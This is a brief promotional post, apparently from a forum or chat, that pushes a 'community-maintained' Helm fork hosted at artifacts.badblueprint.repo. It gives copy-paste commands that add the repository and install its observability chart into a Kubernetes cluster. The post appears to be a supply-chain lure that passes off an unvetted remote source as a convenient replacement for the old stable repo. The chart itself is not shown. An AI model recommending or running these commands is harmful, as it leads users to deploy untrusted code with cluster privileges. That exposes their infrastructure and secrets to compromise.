New drop from the community-maintained "obs" Helm fork — perfect for teams that miss the old stable repo.
Add it and get dashboards + alerts in one go:

```
helm repo add obs https://artifacts.badblueprint.repo
helm repo update
helm upgrade --install obs-stack obs/cluster-observability-stack --namespace monitoring --create-namespace
```

Maintainers keep everything up to date with the latest Grafana and Prometheus defaults. Super light footprint, works on dev clusters instantly.
